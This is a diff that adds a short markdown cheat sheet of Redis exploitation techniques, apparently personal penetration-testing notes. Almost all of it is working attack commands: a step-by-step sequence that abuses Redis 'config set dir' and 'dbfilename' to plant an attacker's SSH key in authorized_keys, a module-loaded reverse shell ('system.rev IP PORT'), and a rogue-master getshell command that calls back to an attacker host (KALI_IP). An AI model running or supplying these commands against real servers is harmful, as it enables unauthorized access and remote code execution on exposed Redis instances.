@@ -1,0 +1,43 @@
+# redis
+
+## Config get dir Exploit
+
+Note : need to know home of redis user
+
+```bash
+# redis-cli -h <IP>
+> config get dir
+1) "dir"
+2) "/var/lib/redis"
+
+# ssh-keygen -f id_rsa
+# 3 spaces before and after key: (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > spaced_id_rsa.txt
+# cat spaced_id_rsa.txt| redis-cli -h IP -x set kashz
+OK
+> config set dir .ssh
+OK
+> config get dir
+"/var/lib/redis/.ssh"
+> config set dbfilename "authorized_keys"
+OK
+> save
+OK
+# ssh using id_rsa and user
+```
+
+## [load module](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#load-redis-module)
+
+```
+# need to be able to write module to target and know path of write file
+
+# revere shell
+system.rev IP PORT
+```
+
+## master-slave exploit
+
+```python
+https://github.com/vulhub/redis-rogue-getshell
+
+python3 redis-master.py -r IP -p 6379 -L KALI_IP -P 27017 -f RedisModulesSDK/exp.so -c "id"
+```
